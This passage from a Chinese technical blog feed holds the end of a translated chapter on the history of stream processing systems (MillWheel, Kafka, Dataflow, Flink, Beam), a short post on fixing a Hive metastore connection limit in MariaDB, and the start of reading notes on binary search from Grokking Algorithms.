前端实时记录的日志事件），这种情况下我们可以计算产生一个非常完美的 Watermark。但对于一些非常复杂的数据输入，例如动态的输入日志集，一个启发式算法可能是我们能够设计出来最能解决业务问题的 Watermark 生成算法了。但无论哪种方式，Watermark 都是解决输入事件完整性最佳方式。之前我们尝试使用处理时间来解决事件输入完整性，有点驴头不及马嘴的感觉。</p><p>得益于客户的需求推动，MillWheel 最终成为能够支持无序数据的强大流处理引擎。因此，题为《MillWheel: Fault-Tolerant Stream Processing at Internet Scale》（图 10-22）的论文花费大部分时间来讨论在这样的系统中提供正确性的各种问题，一致性保证、Watermark。如果您对这个主题感兴趣，那值得花时间去读读这篇论文。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7c6d50hj20u00jrdix.jpg" alt></p><p>MillWheel 论文发表后不久，MillWheel 就成为 Flume 底层提供支撑的流式处理引擎，我们称之为 Streaming Flume。今天在谷歌内部，MillWheel 被下一代理论更为领先的系统所替换: Windmill（这套系统同时也为 DataFlow 提供了执行引擎），这是一套基于 MillWheel 之上，博采众家之长的大数据处理系统，包括提供更好的调度和分发策略、更清晰的框架和业务代码解耦。</p><p>MillWheel 给我们带来最大的价值是之前列出的四个概念（数据精确一次性处理，持久化的状态存储，Watermark，持久定时器）为流式计算提供了工业级生产保障：即使在不可靠的商用硬件上，也可以对无序数据进行稳定的、低延迟的处理。</p><h3 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h3><p>我们开始讨论 Kafka（图 10-23）。 Kafka 在本章讨论的系统中是独一无二的，因为它不是数据计算框架，而是数据传输和存储的工具。但是，毫无疑问，Kafka 在我们正在讨论的所有系统中扮演了推动流处理的最有影响力的角色之一。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7citnfkj20u00dwt8x.jpg" alt></p><p>如果你不熟悉它，我们可以简单描述为: Kafka 本质上是一个持久的流式数据传输和存储工具，底层系统实现为一组带有分区结构的日志型存储。它最初是由 Neha Narkhede 和 Jay Kreps 等业界大牛在 LinkedIn 公司内部开发的，其卓越的特性有:</p><ul><li>提供一个干净的持久性模型，让大家在流式处理领域里面可以享受到批处理的产品特性，例如持久化、可重放。</li><li>在生产者和消费者之间提供弹性隔离。</li><li>我们在第 6 章中讨论过的流和表之间的关系，揭示了思考数据处理的基本方式，同时还提供了和数据库打通的思路和概念。</li><li>来自于上述所有方面的影响，不仅让 Kafka 成为整个行业中大多数流处理系统的基础，而且还促进了流处理数据库和微服务运动。</li></ul><p>在这些特性中，有两个对我来说最为突出。第一个是流数据的持久化和可重放性的应用。在 Kafka 之前，大多数流处理系统使用某种临时、短暂的消息系统，如 Rabbit MQ 甚至是普通的 TCP 套接字来发送数据。数据处理的一致性往往通过生产者数据冗余备份来实现（即，如果下游数据消费者出现故障，则上游生产者将数据进行重新发送），但是上游数据的备份通常也是临时保存一下。大多数系统设计完全忽略在开发和测试中需要重新拉取数据重新计算的需求。但 Kafka 的出现改变了这一切。从数据库持久日志概念得到启发并将其应用于流处理领域，Kafka 让我们享受到了如同 Batch 数据源一样的安全性和可靠性。凭借持久化和可重放的特点，流计算在健壮性和可靠性上面又迈出关键的一步，为后续替代批处理系统打下基础。</p><p>作为一个流式系统开发人员，Kafka 的持久化和可重放功能对业界产生一个更有意思的变化就是: 当今大量流处理引擎依赖源头数据可重放来提供端到端精确一次的计算保障。可重放的特点是 Apex，Flink，Kafka Streams，Spark 和 Storm 的端到端精确一次保证的基础。当以精确一次模式执行时，每个系统都假设 / 要求输入数据源能够重放之前的部分数据 (从最近 Checkpoint 到故障发生时的数据)。当流式处理系统与不具备重放能力的输入源一起使用时（哪怕是源头数据能够保证可靠的一致性数据投递，但不能提供重放功能），这种情况下无法保证端到端的完全一次语义。这种对可重放（以及持久化等其他特点）的广泛依赖是 Kafka 在整个行业中产生巨大影响的间接证明。</p><p>Kafka 系统中第二个值得注意的重点是流和表理论的普及。我们花了整个第 6 章以及第 8 章、第 9 章来讨论流和表，可以说流和表构成了数据处理的基础，无论是 MapReduce 及其演化系统，SQL 数据库系统，还是其他分支的数据处理系统。并不是所有的数据处理方法都直接基于流或者表来进行抽象，但从概念或者理论上说，表和流的理论就是这些系统的运作方式。作为这些系统的用户和开发人员，理解我们所有系统构建的核心基础概念意义重大。我们都非常感谢 Kafka 社区的开发者，他们帮助我们更广泛更加深入地了解到批流理论。</p><p>如果您想了解更多关于 Kafka 及其理论核心，JackKreps 的《I❤Logs》（O’Reilly; 图 10-24）是一个很好的学习资料。另外，正如第 6 章中引用的那样，Kreps 和 Martin Kleppmann 有两篇文章（图 10-25），我强烈建议您阅读一下关于流和表相关理论。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7cqke9dj20dw0i80tf.jpg" alt></p><p>Kafka 为流处理领域做出了巨大贡献，可以说比其他任何单一系统都要多。特别是，对输入和输出流的持久性和可重放的设计，帮助将流计算从近似工具的小众领域发展到在大数据领域妇孺皆知的程度起了很大作用。此外，Kafka 社区推广的流和表理论对于数据处理引发了我们深入思考。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7cwnv5vj20u00clq3j.jpg" alt></p><h3 id="DataFlow"><a href="#DataFlow" class="headerlink" title="DataFlow"></a>DataFlow</h3><p>Cloud Dataflow（图 10-26）是 Google 完全托管的、基于云架构的数据处理服务。 Dataflow 于 2015 年 8 月推向全球。DataFlow 将 MapReduce，Flume 和 MillWheel 的十多年经验融入其中，并将其打包成 Serverless 的云体验。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7d644kqj20u00qe0xe.jpg" alt></p><p>虽然 Google 的 Dataflow 的 Serverless 特点可能是从系统角度来看最具技术挑战性以及有别于其他云厂商产品的重要因素，但我想在此讨论主要是其批流统一的编程模型。编程模型包括我们在本书的大部分内容中所讨论的转换，窗口，水印，触发器和聚合计算。当然，所有这些讨论都包含了思考问题的 what、where、when、how。</p><p>DataFlow 模型首先诞生于 Flume，因为我们希望将 MillWheel 中强大的无序数据计算能力整合到 Flume 提供的更高级别的编程模型中。这个方式可以让 Google 员工在内部使用 Flume 进行统一的批处理和流处理编程。</p><p>关于统一模型的核心关键思考在于，尽管在当时我们也没有深刻意识到，批流处理模型本质上没有区别: 仅仅是在表和流的处理上有些小变化而已。正如我们在第 6 章中所讨论到的，主要的区别仅仅是在将表上增量的变化转换为流，其他一切在概念上是相同的。通过利用批处理和流处理两者大量的共性需求，可以提供一套引擎，适配于两套不同处理方式，这让流计算系统更加易于使用。</p><p>除了利用批处理和流处理之间的系统共性之外，我们还仔细查看了多年来我们在 Google 中遇到的各种案例，并使用这些案例来研究统一模型下系统各个部分。我们研究主要内容如下：</p><ul><li>未对齐的事件时间窗口（如会话窗口），能够简明地表达这类复杂的分析，同时亦能处理乱序数据。</li><li>自定义窗口支持，系统内置窗口很少适合所有业务场景，需要提供给用户自定义窗口的能力。</li><li>灵活的触发和统计模式，能够满足正确性，延迟，成本的各项业务需求。</li><li>使用 Watermark 来推断输入数据的完整性，这对于异常检测等用例至关重要，其中异常检测逻辑会根据是否缺少数据做出异常判断。</li><li>底层执行环境的逻辑抽象，无论是批处理，微批处理还是流式处理，都可以在执行引擎中提供灵活的选择，并避免系统级别的参数设置（例如微批量大小）进入逻辑 API。</li></ul><p>总之，这些平衡了灵活性，正确性，延迟和成本之间的关系，将 DataFlow 的模型应用于大量用户业务案例之中。</p><p>考虑到我们之前整本书都在讨论 DataFlow 和 Beam 模型的各类问题，我在此处重新给大家讲述这些概念纯属多此一举。但是，如果你正在寻找稍微更具学术性的内容以及一些应用案例，我推荐你看下 2015 年发表的《DataFlow 论文..》（图 10-27）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7dd2y3uj20u00qe0xe.jpg" alt></p><p>DataFlow 还有不少可以大书特书的功能特点，但在这章内容构成来看，我认为 DataFlow 最重要的是构建了一套批流统一的大数据处理模型。DataFlow 为我们提供了一套全面的处理无界且无序数据集的能力，同时这套系统很好的平衡了正确性、延迟、成本之间的相互关系。</p><h3 id="Flink"><a href="#Flink" class="headerlink" title="Flink"></a>Flink</h3><p>Flink（图 10-28）在 2015 年突然出现在大数据舞台，然后似乎在一夜之间从一个无人所知的系统迅速转变为人人皆知的流式处理引擎。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7doer6ij20u00dwaaa.jpg" alt></p><p>在我看来，Flink 崛起有两个主要原因：</p><ul><li>采用 Dataflow/Beam 编程模型，使其成为完备语义功能的开源流式处理系统。</li><li>其高效的快照实现方式，源自 Chandy 和 Lamport 的原始论文《“Distributed Snapshots: Determining Global States of Distributed Systems”》的研究，这为其提供了正确性所需的强一致性保证。</li></ul><p>Reuven 在第 5 章中简要介绍了 Flink 的一致性机制，这里在重申一下，其基本思想是在系统中的 Worker 之间沿着数据传播路径上产生周期性 Barrier。这些 Barrier 充当了在不同 Worker 之间传输数据时的对齐机制。当一个 Worker 在其所有上游算子输入来源（即来自其所有上游一层的 Worker）上接收到全部 Barrier 时，Worker 会将当前所有 key 对应的状态写入一个持久化存储。这个过程意味着将这个 Barrier 之前的所有数据都做了持久化。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7du1knjj20u00qbwha.jpg" alt></p><p>通过调整 Barrier 的生成频率，可以间接调整 Checkpoint 的执行频率，从而降低时延并最终获取更高的吞吐（其原因是做 Checkpoint 过程中涉及到对外进行持久化数据，因此会有一定的 IO 导致延时）。</p><p>Flink 既能够支持精确一次的语义处理保证，同时又能够提供支持事件时间的处理能力，这让 Flink 获取的巨大的成功。接着， Jamie Grier 发表他的题为“《Extending the Yahoo! Streaming Benchmark》“（图 10-30）的文章，文章中描述了 Flink 性能具体的测试数据。在那篇文章中，杰米描述了两个令人印象深刻的特点：</p><ol><li><p>构建一个用于测试的 Flink 数据管道，其拥有比 Twitter Storm 更高的准确性（归功于 Flink 的强一次性语义），但成本却降到了 1％。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7e1vjk5j20u00wwq5v.jpg" alt></p><ol start="2"><li><p>Flink 在精确一次的处理语义参数设定下，仍然达到 Storm 的 7.5 倍吞吐量（而且，Storm 还不具备精确一次的处理语义）。此外，由于网络被打满导致 Flink 的性能受到限制 ; 进一步消除网络瓶颈后 Flink 的吞吐量几乎达到 Storm 的 40 倍。</p><p>从那时起，许多其他流式处理项目（特别是 Storm 和 Apex）都采用了类似算法的数据处理一致性机制。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7ec9lylj20u00vk0u6.jpg" alt></p><p>通过快照机制，Flink 获得了端到端数据一致性。Flink 更进了一步，利用其快照的全局特性，提供了从过去的任何一点重启整个管道的能力，这一功能称为 SavePoint（在 Fabian Hueske 和 Michael Winters 的帖子 [《Savepoints: Turning Back Time》(<a href="https://data-artisans.com/blog/turning-back-time-savepoints)]" target="_blank" rel="noopener">https://data-artisans.com/blog/turning-back-time-savepoints)]</a> 中有所描述，[图 10-31]）。Savepoints 功能参考了 Kafka 应用于流式传输层的持久化和可重放特性，并将其扩展应用到整个底层 Pipeline。流式处理仍然遗留大量开放性问题有待优化和提升，但 Flink 的 Savepoints 功能是朝着正确方向迈出的第一步，也是整个行业非常有特点的一步。 如果您有兴趣了解有关 Flink 快照和保存点的系统构造的更多信息，请参阅《State Management in Apache Flink》（图 10-32），论文详细讨论了相关的实现。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7ein1n1j20u00qstdj.jpg" alt></p><p>除了保存点之外，Flink 社区还在不断创新，包括将第一个实用流式 SQL API 推向大规模分布式流处理引擎的领域，正如我们在第 8 章中所讨论的那样。 总之，Flink 的迅速崛起成为流计算领军角色主要归功于三个特点：</p><ol><li>整合行业里面现有的最佳想法（例如，成为第一个开源 DataFlow/Beam 模型）</li><li>创新性在表上做了大量优化，并将状态管理发挥更大价值，例如基于 Snapshot 的强一致性语义保证，Savepoints 以及流式 SQL。</li><li>迅速且持续地推动上述需求落地。</li></ol><p>另外，所有这些改进都是在开源社区中完成的，我们可以看到为什么 Flink 一直在不断提高整个行业的流计算处理标准。</p><h3 id="Beam"><a href="#Beam" class="headerlink" title="Beam"></a>Beam</h3><p>我们今天谈到的最后一个系统是 Apache Beam（图 10-33）。 Beam 与本章中的大多数其他系统的不同之处在于，它主要是编程模型，API 设计和可移植层，而不是带有执行引擎的完整系统栈。但这正是我想强调的重点：正如 SQL 作为声明性数据处理的通用语言一样，Beam 的目标是成为程序化数据处理的通用语言。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7evt7rkj20u00dw3yq.jpg" alt></p><p>具体而言，Beam 由许多组件组成：</p><ul><li>一个统一的批量加流式编程模型，继承自 Google DataFlow 产品设计，以及我们在本书的大部分内容中讨论的细节。该模型独立于任何语言实现或 runtime 系统。您可以将此视为 Beam 等同于描述关系代数模型的 SQL。</li><li>一组实现该模型的 SDK（软件开发工具包），允许底层的 Pipeline 以不同 API 语言的惯用方式编排数据处理模型。 Beam 目前提供 Java，Python 和 Go 的 SDK，可以将它们视为 Beam 的 SQL 语言本身的程序化等价物。</li><li>一组基于 SDK 的 DSL（特定于域的语言），提供专门的接口，以独特的方式描述模型在不同领域的接口设计。SDK 来描述上述模型处理能力的全集，但 DSL 描述一些特定领域的处理逻辑。 Beam 目前提供了一个名为 Scio 的 Scala DSL 和一个 SQL DSL，它们都位于现有 Java SDK 之上。</li><li>一组可以执行 Beam Pipeline 的执行引擎。执行引擎采用 Beam SDK 术语中描述的逻辑 Pipeline，并尽可能高效地将它们转换为可以执行的物理计划。目前，针对 Apex，Flink，Spark 和 Google Cloud Dataflow 存在对应的 Beam 引擎适配。在 SQL 术语中，您可以将这些引擎适配视为 Beam 在各种 SQL 数据库的实现，例如 Postgres，MySQL，Oracle 等。</li></ul><p>Beam 的核心愿景是实现一套可移植接口层，最引人注目的功能之一是它计划支持完整的跨语言可移植性。尽管最终目标尚未完全完成（但即将面市），让 Beam 在 SDK 和引擎适配之间提供足够高效的抽象层，从而实现 SDK 和引擎适配之间的任意切换。我们畅想的是，用 JavaScript SDK 编写的数据 Pipeline 可以在用 Haskell 编写的引擎适配层上无缝地执行，即使 Haskell 编写的引擎适配本身没有执行 JavaScript 代码的能力。</p><p>作为一个抽象层，Beam 如何定位自己和底层引擎关系，对于确保 Beam 实际为社区带来价值至关重要，我们也不希望看到 Beam 引入一个不必要的抽象层。这里的关键点是，Beam 的目标永远不仅仅是其所有底层引擎功能的交集（类似最小公分母）或超集（类似厨房水槽）。相反，它旨在为整个社区大数据计算引擎提供最佳的想法指导。这里面有两个创新的角度:</p><ul><li><strong>Beam 本身的创新</strong></li></ul><p>Beam 将会提出一些 API，这些 API 需要底层 runtime 改造支持，并非所有底层引擎最初都支持这些功能。这没关系，随着时间的推移，我们希望许多底层引擎将这些功能融入未来版本中 ; 对于那些需要这些功能的业务案例来说，具备这些功能的引擎通常会被业务方选择。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7f2cqotj20u00l4gnr.jpg" alt></p><p>这里举一个 Beam 里面关于 SplittableDoFn 的 API 例子，这个 API 可以用来实现一个可组合的，可扩展的数据源。（具体参看 Eugene Kirpichov 在他的文章《 “Powerful and modular I/O connectors with Splittable DoFn in Apache Beam》中描述 [图 10-34]）。它设计确实很有特点且功能强大，目前我们还没有看到所有底层引擎对动态负载均衡等一些更具创新性功能进行广泛支持。然而，我们预计这些功能将随着时间的推移而持续加入底层引擎支持的范围。</p><ul><li><strong>底层引擎的创新</strong></li></ul><p>底层引擎适配可能会引入底层引擎所独特的功能，而 Beam 最初可能并未提供 API 支持。这没关系，随着时间的推移，已证明其有用性的引擎功能将在 Beam API 逐步实现。</p><p>这里的一个例子是 Flink 中的状态快照机制，或者我们之前讨论过的 Savepoints。 Flink 仍然是唯一一个以这种方式支持快照的公开流处理系统，但是 Beam 提出了一个围绕快照的 API 建议，因为我们相信数据 Pipeline 运行时优雅更新对于整个行业都至关重要。如果我们今天推出这样的 API，Flink 将是唯一支持它的底层引擎系统。但同样没关系，这里的重点是随着时间的推移，整个行业将开始迎头赶上，因为这些功能的价值会逐步为人所知。这些变化对每个人来说都是一件好事。</p><p>通过鼓励 Beam 本身以及引擎的创新，我们希望推进整个行业快速演化，而不用再接受功能妥协。 通过实现跨执行引擎的可移植性承诺，我们希望将 Beam 建立为表达程序化数据处理流水线的通用语言，类似于当今 SQL 作为声明性数据处理的通用处理方式。这是一个雄心勃勃的目标，我们并没有完全实现这个计划，到目前为止我们还有很长的路要走。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们对数据处理技术的十五年发展进行了蜻蜓点水般的回顾，重点关注那些推动流式计算发展的关键系统和关键思想。来，最后，我们再做一次总结：</p><ul><li><strong>MapReduce：可扩展性和简单性</strong> 通过在强大且可扩展的执行引擎之上提供一组简单的数据处理抽象，MapReduce 让我们的数据工程师专注于他们的数据处理需求的业务逻辑，而不是去构建能够适应在一大堆普通商用服务器上的大规模分布式处理程序。</li><li><strong>Hadoop：开源生态系统</strong> 通过构建一个关于 MapReduce 的开源平台，无意中创建了一个蓬勃发展的生态系统，其影响力所及的范围远远超出了其最初 Hadoop 的范围，每年有大量的创新性想法在 Hadoop 社区蓬勃发展。</li><li><strong>Flume：管道及优化</strong> 通过将逻辑流水线操作的高级概念与智能优化器相结合，Flume 可以编写简洁且可维护的 Pipeline，其功能突破了 MapReduce 的 Map→Shuffle→Reduce 的限制，而不会牺牲性能。</li><li><strong>Storm：弱一致性，低延迟</strong> 通过牺牲结果的正确性以减少延迟，Storm 为大众带来了流计算，并开创了 Lambda 架构的时代，其中弱一致的流处理引擎与强大一致的批处理系统一起运行，以实现真正的业务目标低延迟，最终一致型的结果。</li><li><strong>Spark: 强一致性</strong> 通过利用强大一致的批处理引擎的重复运行来提供无界数据集的连续处理，Spark Streaming 证明至少对于有序数据集的情况，可以同时具有正确性和低延迟结果。</li><li><strong>MillWheel：乱序处理</strong> 通过将强一致性、精确一次处理与用于推测时间的工具（如水印和定时器）相结合，MillWheel 做到了无序数据进行准确的流式处理。</li><li><strong>Kafka: 持久化的流式存储，流和表对偶性</strong> 通过将持久化数据日志的概念应用于流传输问题，Kafka 支持了流式数据可重放功能。通过对流和表理论的概念进行推广，阐明数据处理的概念基础。</li><li><strong>Cloud Dataflow：统一批流处理引擎</strong> 通过将 MillWheel 的无序流式处理与高阶抽象、自动优化的 Flume 相结合，Cloud Dataflow 为批流数据处理提供了统一模型，并且灵活地平衡正确性、计算延迟、成本的关系。</li><li><strong>Flink：开源流处理创新者</strong> 通过快速将无序流式数据处理的强大功能带到开源世界，并将其与分布式快照及保存点功能等自身创新相结合，Flink 提高了开源流处理的业界标准并引领了当前流式处理创新趋势。</li><li><strong>Beam: 可移植性</strong> 通过提供整合行业最佳创意的强大抽象层，Beam 提供了一个可移植 API 抽象，其定位为与 SQL 提供的声明性通用语言等效的程序接口，同时也鼓励在整个行业中推进创新。</li></ul><p>可以肯定的说，我在这里强调的这 10 个项目及其成就的说明并没有超出当前大数据的历史发展。但是，它们对我来说是一系列重要且值得注意的大数据发展里程碑，它共同描绘了过去十五年中流处理演变的时间轴。自最早的 MapReduce 系统开始，尽管沿途有许多起伏波折，但不知不觉我们已经走出来很长一段征程。即便如此，在流式系统领域，未来我们仍然面临着一系列的问题亟待解决。正所谓：路漫漫其修远兮，吾将上下而求索。</p></li></ol></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;文章原作者是Google MapReduce小组的一员，翻译自《Streaming System》最后一章《The Evolution of Large-Scale Data Processing》，翻译者是 陈守元（花名：巴真），阿里巴巴高级产品专家。阿里巴巴实时计算团队产品负责人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我最近看了一些深度学习的文章，有一些感触，机器学习的使用范围确实很有限，大众以为现在的AI和现在实际上的AI其实根本不是一个东西，如果机器学习能在短时间内迅速发展起来，我个人觉得只有两种可能：第一种可能：要么横向在某个传统行业取得巨大进展，被其他行业纷纷效仿，但是很难，机器学习需要都整体数据有一个完全的把控，只有已经自动化相当完备的行业才有使用机器学习的基础，更何况还有行业壁垒，从中盈利的公司可能根本不会宣传，别的人也就无从得知了。&lt;/p&gt;
&lt;p&gt;第二种可能：深度学习出现重大进展，深度学习作为黑盒使用是一件很离谱的事情，理论上来说要解析深度学习的原理需要很多别的学科来进行理论支持，短时间内出现重大进展其实可能也不大。&lt;/p&gt;
&lt;p&gt;那么如果AI这阵风最终没有刮起来，那么还是要看流处理的了。&lt;/p&gt;
&lt;p&gt;下面是原文：&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="技术发展史" scheme="http://yoursite.com/categories/Reading-notes/%E6%8A%80%E6%9C%AF%E5%8F%91%E5%B1%95%E5%8F%B2/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="大数据" scheme="http://yoursite.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
      <category term="流式计算" scheme="http://yoursite.com/tags/%E6%B5%81%E5%BC%8F%E8%AE%A1%E7%AE%97/"/>
    
      <category term="大数据浪潮史" scheme="http://yoursite.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%B5%AA%E6%BD%AE%E5%8F%B2/"/>
    
  </entry>
  
  <entry>
    <title>Hive Metastore Server发送元数据请求过多被拒绝</title>
    <link href="http://yoursite.com/2019/05/29/Hive%20Metastore%20Server%E5%8F%91%E9%80%81%E5%85%83%E6%95%B0%E6%8D%AE%E8%AF%B7%E6%B1%82%E8%BF%87%E5%A4%9A%E8%A2%AB%E6%8B%92%E7%BB%9D/"/>
    <id>http://yoursite.com/2019/05/29/Hive Metastore Server发送元数据请求过多被拒绝/</id>
    <published>2019-05-28T23:26:30.614Z</published>
    <updated>2019-05-28T08:44:36.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>在TPCDS测试中Hive莫名其妙挂掉</p></blockquote><a id="more"></a> <p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h4gok9evj20lx09paaq.jpg" alt></p><p>经查，是MySQL最大连接尝试数设置过低，连接失败10次就无法再连接</p><p>在设置的mysql数据库里面，调整次数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| amon               |</span><br><span class="line">| cm                 |</span><br><span class="line">| hive               |</span><br><span class="line">| hue                |</span><br><span class="line">| mysql              |</span><br><span class="line">| oozie              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| test               |</span><br><span class="line">+--------------------+</span><br><span class="line">9 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show variables like &apos;%max_connect_errors%&apos;;</span><br><span class="line">+--------------------+-------+</span><br><span class="line">| Variable_name      | Value |</span><br><span class="line">+--------------------+-------+</span><br><span class="line">| max_connect_errors | 10    |</span><br><span class="line">+--------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; set global max_connect_errors = 1000;</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show variables like &apos;%max_connect_errors%&apos;;</span><br><span class="line">+--------------------+-------+</span><br><span class="line">| Variable_name      | Value |</span><br><span class="line">+--------------------+-------+</span><br><span class="line">| max_connect_errors | 1000  |</span><br><span class="line">+--------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>搞定</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;在TPCDS测试中Hive莫名其妙挂掉&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="CDH" scheme="http://yoursite.com/categories/Hadoop/CDH/"/>
    
    
      <category term="Hive" scheme="http://yoursite.com/tags/Hive/"/>
    
  </entry>
  
  <entry>
    <title>Grokking Algorithms</title>
    <link href="http://yoursite.com/2019/05/29/Grokking%20Algorithms/"/>
    <id>http://yoursite.com/2019/05/29/Grokking Algorithms/</id>
    <published>2019-05-28T23:26:30.609Z</published>
    <updated>2019-05-29T22:59:14.502Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>对算法的了解一直很肤浅（听学数学的朋友说算法在数学中也叫数论？），本书阅读不求快，本就是入门读物，希望能尽量理解，争取早日拿下。</p><p>这边值得一提的是作者推荐了一个网站，可汗学院，<code>khanacademy.org</code>  mark一下。</p><p>看完40%来总结一下，非常好，文盲也能看懂的算法入门。</p><p>这本书看完应该会扫一眼结城浩的《图解密码学》</p></blockquote><a id="more"></a> <h2 id="第一章-算法简介"><a href="#第一章-算法简介" class="headerlink" title="第一章 算法简介"></a>第一章 算法简介</h2><h3 id="1-1-引言"><a href="#1-1-引言" class="headerlink" title="1.1 引言"></a>1.1 引言</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2w8rt2sg9j20fk026mxh.jpg" alt></p><p>好的，我具备了</p><h3 id="1-2-二分查找"><a href="#1-2-二分查找" class="headerlink" title="1.2 二分查找"></a>1.2 二分查找</h3><p>二分查找(binary search)又叫折半搜索(half-interval search)、对数搜索(logarithmic search)，是一种在<strong>有序数组</strong>中查找某一特定元素的搜索算法。搜索过程从数组的中间元素开始，如果中间元素正好是要查找的元素，则搜索过程结束；如果某一特定元素大于或者小于中间元素，则在数组大于或小于中间元素的那一半中查找，而且跟开始一样从中间元素开始比较。如果在某一步骤数组为空，则代表找不到。这种搜索算法每一次比较都使搜索范围缩小一半。</p><p>对数：幂运算的逆运算</p><p>假设你要在字典中查找一个单词，而该字典包含240000个单词，<br>你认为每种查找最多需要多少步？</p><p>log<sub>2</sub> n步，本题中就是18步</p><p>给定一个有序数组和一个需要定位的数字，先创建两个变量 low 和 high，low和high一开始分别是数组的第一个和最后一个坐标，划定一个取中间元素的空间，然后取出中间元素和目标元素比较，如果不是的话，就更改low或者high中某一个的坐标为(low + high)/2，将查找空间缩小为原来的二分之一，然后继续。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(list, item)</span>:</span></span><br><span class="line">  low = <span class="number">0</span></span><br><span class="line">  high = len(list) - <span class="number">1</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    guess = list[mid]</span><br><span class="line">    <span class="keyword">if</span> guess == item:</span><br><span class="line">      <span class="keyword">return</span> mid</span><br><span class="line">    <span class="keyword">if</span> guess &gt; item:</span><br><span class="line">      high = mid <span class="number">-1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      low = mid + <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">my_list = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> binary_search(my_list, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> binary_search(my_list, <span class="number">-1</span>)</span><br></pre></td></tr></table></figure><p><a href="https://colab.research.google.com/notebook#create=true&amp;language=python3" target="_blank" rel="noopener">运行环境</a></p><p>Tips：关于为什么更换搜索区域的时候没有直接用high = mid 或者low = mid</p><p>注意while的条件，如果没有这一条，范围缩小到两个数的时候，会无限循环</p><h4 id="运行时间"><a href="#运行时间" class="headerlink" title="运行时间"></a>运行时间</h4><p>最多猜测次数与列表长度相同被称为线性时间(linear time).</p><p>二分查找的运行时间为对数时间(log time).</p><h3 id="1-3-大-O-表示法"><a href="#1-3-大-O-表示法" class="headerlink" title="1.3 大 O 表示法"></a>1.3 大 O 表示法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">O(1):             